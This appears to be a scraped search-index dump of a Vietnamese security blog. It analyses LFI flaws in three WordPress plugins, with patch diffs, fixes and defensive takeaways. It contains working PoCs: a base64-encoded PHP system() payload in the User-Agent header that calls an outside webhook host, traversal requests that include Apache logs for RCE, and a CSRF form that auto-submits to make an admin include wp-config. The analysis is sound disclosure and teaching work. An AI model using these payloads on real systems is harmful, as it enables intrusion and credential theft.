system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rGửi request với LFI payload trỏ đến /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Kết quả LFI =\u003e RCE thành công Giải thích: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Khi truy cập trang với User‑Agent chứa payload trên, Apache sẽ lưu payload này vào access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" Khi include() một file, PHP sẽ thực thi mọi mã PHP (\u003c?php ?\u003e) có trong nội dung file trước khi trả về. Payload được mã hoá bằng Base64 và giải mã tại thời điểm include bằng base64_decode tránh lỗi escape dấu ngoặc kép (\" → \\\") khi logger lưu. Lệnh giải mã sẽ trở thành: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Cuối cùng system() sẽ chạy lệnh này và trả output. Cảnh báo Lưu ý: dù base64_decode bị chặn bởi plugin nhưng Apache đã lưu trữ trước khi plugin xử lý, chuỗi Base64 vẫn được ghi vào log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#log-poisoning--lfi--rce"},{"categories":["CVE Analyst"],"collections":null,"content":"Log poisoning → LFI → RCE\rStep 1\rGửi request với PHP code đặt trong User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rGửi request với LFI payload trỏ đến /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Kết quả LFI =\u003e RCE thành công Giải thích: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Khi truy cập trang với User‑Agent chứa payload trên, Apache sẽ lưu payload này vào access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" Khi include() một file, PHP sẽ thực thi mọi mã PHP (\u003c?php ?\u003e) có trong nội dung file trước khi trả về. Payload được mã hoá bằng Base64 và giải mã tại thời điểm include bằng base64_decode tránh lỗi escape dấu ngoặc kép (\" → \\\") khi logger lưu. Lệnh giải mã sẽ trở thành: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Cuối cùng system() sẽ chạy lệnh này và trả output. Cảnh báo Lưu ý: dù base64_decode bị chặn bởi plugin nhưng Apache đã lưu trữ trước khi plugin xử lý, chuỗi Base64 vẫn được ghi vào log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#step-1"},{"categories":["CVE Analyst"],"collections":null,"content":"Log poisoning → LFI → RCE\rStep 1\rGửi request với PHP code đặt trong User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rGửi request với LFI payload trỏ đến /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Kết quả LFI =\u003e RCE thành công Giải thích: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Khi truy cập trang với User‑Agent chứa payload trên, Apache sẽ lưu payload này vào access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" Khi include() một file, PHP sẽ thực thi mọi mã PHP (\u003c?php ?\u003e) có trong nội dung file trước khi trả về. Payload được mã hoá bằng Base64 và giải mã tại thời điểm include bằng base64_decode tránh lỗi escape dấu ngoặc kép (\" → \\\") khi logger lưu. Lệnh giải mã sẽ trở thành: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Cuối cùng system() sẽ chạy lệnh này và trả output. Cảnh báo Lưu ý: dù base64_decode bị chặn bởi plugin nhưng Apache đã lưu trữ trước khi plugin xử lý, chuỗi Base64 vẫn được ghi vào log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#step-2"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 5.4.01 của Hide My WP Ghost cho phép LFI vì plugin tái tạo đường dẫn rồi include() mà không canonicalize/whitelist. Bằng cách kết hợp log‑poisoning và payload chứa /wp-activate.php/?, kẻ tấn công có thể từ LFI leo thành RCE trong một số cấu hình. Lỗ hổng được vá trong 5.4.02 bằng việc sanitize URL trước khi trả về. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông include trực tiếp dữ liệu từ request. Dùng realpath() / basename() / whitelist / kiểm tra base_dir trước khi include. sanitize_text_field() không đủ để ngăn traversal. Log poisoning (User‑Agent, Referer…) có thể tạo nguồn payload cho LFI — không ghi thô nội dung có thể được include sau này. Vá phải kết hợp: sanitize + canonicalize + giới hạn thư mục + kiểm soát quyền ghi log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:4","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Hide My WP Ghost Plugin \u003c= 5.4.01 is vulnerable to Local File Inclusion ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin License For Envato phiên bản ≤ 1.0.0 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) và 1.1.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; } ?\u003e \u003c/div\u003e Trong phiên bản lỗi, giá trị của biến $action được lấy trực tiếp từ tham số $_GET['tab']. Mặc dù biến này được xử lý qua hàm sanitize_text_field(), hàm này chỉ loại bỏ thẻ HTML - chứ không ngăn chặn các chuỗi traversal như ../. Do đó, attacker có thể truyền vào một giá trị như ?tab=../../somefile, khiến $action chứa đường dẫn ngoài mong đợi. Khi biến này được nối vào $template và sau đó được include =\u003e Xảy ra LFI. Bản vá: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e Bản vá đã thực hiện nhiều biện pháp để ngăn chặn lỗ hổng LFI và củng cố tính bảo mật của phần xử lý tham số tab: Sử dụng whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Kiểm tra nonce chống CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) Lý do CVE được gán là Unauthenticated là vì kẻ tấn công không cần tài khoản riêng trên site mục tiêu để khai thác. Kỹ thuật phổ biến là lừa một admin (hoặc người có quyền) truy cập trang web chứa payload. Khi admin mở trang đó, trình duyệt sẽ gửi yêu cầu tới site WordPress kèm cookie phiên đang còn hiệu lực - do đó yêu cầu được coi là đã xác thực là từ admin. Nếu plugin nhận và thực thi tham số mà không kiểm tra nonce hoặc quyền truy cập, payload LFI sẽ được xử lý và dẫn tới lỗ hổng. Chuẩn hóa và kiểm tra đường dẫn bằng realpath() $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rpublic function plugin_page() { $license_envato_api = new EnvatoLicenseApiCall(); $settingsView = __DIR__ . '/views/settingsView.php'; if ( file_exists( $settingsView ) ) { include $settingsView; } } settingsView.php luôn tồn tại trong mã nguồn nên chắc chắn được include trong hàm plugin_page() public function admin_menu() { $parent_slug = 'licenseenvato'; $capability = 'manage_options'; add_submenu_page( $parent_slug, __( 'Settings', 'licenseenvato' ), __( 'Settings', 'licenseenvato' ), $capability, $parent_slug.'-settings', [ $this, 'settings' ] ); } public function settings() { $settings = new Settings(); $settings-\u003eplugin_page(); } plugin_page() được gọi thông qua callback của submenu “Settings”, được đăng ký trong hàm admin_menu(). Submenu này có quyền truy cập manage_options, nên chỉ hiển thị với admin. Khi admin mở trang con “Settings” (endpoint licenseenvato-settings), WordPress sẽ gọi settings(), từ đó khởi tạo lớp Settings và chạy plugin_page(). ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web chứa LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ew41bu1\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"licenseenvato-settings\"\u003e \u003cinput type=\"text\" name=\"tab\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rGửi link đến trang web cho admin Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web chứa LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2\rGửi link đến trang web cho admin Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#step-1"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web chứa LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2\rGửi link đến trang web cho admin Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#step-2"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 1.0.0 của License For Envato cho phép LFI vì include() dùng $atts['template'] chưa được xác thực; lỗ hổng đã được vá trong 1.1.0 bằng basename() + realpath() và kiểm tra base_dir. ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rViệc chỉ dùng sanitize_text_field() không đủ để ngăn chặn path traversal trong PHP. Mọi tham số được dùng trong include() hoặc thao tác file phải được kiểm soát bằng whitelist hoặc realpath(). CSRF kết hợp LFI có thể biến lỗ hổng dành cho admin thành lỗ hổng unauthenticated, nếu thiếu kiểm tra nonce. Cần kiểm tra kỹ input và giới hạn phạm vi file có thể truy cập, đặc biệt trong các plugin xử lý template hoặc view. Luôn xác thực và ràng buộc đường dẫn khi include file - không bao giờ tin tưởng dữ liệu từ request, dù đã “sanitize”. ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress License For Envato Plugin \u003c= 1.0.0 is vulnerable to Local File Inclusion ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Subscribe to Download Lite phiên bản ≤ 1.2.9 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) và 1.3.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e Trong phiên bản lỗi, $form_template được concat vào chuỗi và include nhưng không xác thực giá trị đầu vào =\u003e nguy cơ LFI xảy ra, ví dụ: $form_template = '../../../../../../../wp-config' Bản vá: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e Bản vá sử dụng basename() để lấy phần tên file của $form_template loại bỏ các ký tự traversal sequence ../, ví dụ: ../../../../../../payload.pdf -\u003e payload.pdf Sau đó concat vào $base_dir và lấy đường dẫn tuyệt đối bằng realpath rồi include() =\u003e triệt tiêu hoàn toàn khả năng LFI. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rform-template.php chứa code có lỗ hổng ở trên được gọi trong stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template là giá trị của $atts['template'] Theo kinh nghiệm phân tích CVE trên WordPress plugin của tôi, $atts thường là các attribute của shortcode, ví dụ: [pornhub id=69] Có thể thấy rằng file form-template.php luôn được include trong khối if-else nằm bên trong phần else, khi cookie stdl_encryption_key không tồn tại (tức là người dùng chưa đăng ký hoặc chưa có khóa mã hóa hợp lệ). stdl-shortcode.php được include trong callback của shortcode subscribe_to_download_form với atts là mảng các attribute của shortcode. function __construct() { add_shortcode('subscribe_to_download_form', array($this, 'generate_shortcode_output')); } function generate_shortcode_output($atts) { wp_enqueue_style('stdl-frontend-custom', STDL_CSS_DIR . '/stdl-custom.css', array(), STDL_VERSION); ob_start(); include(STDL_PATH . 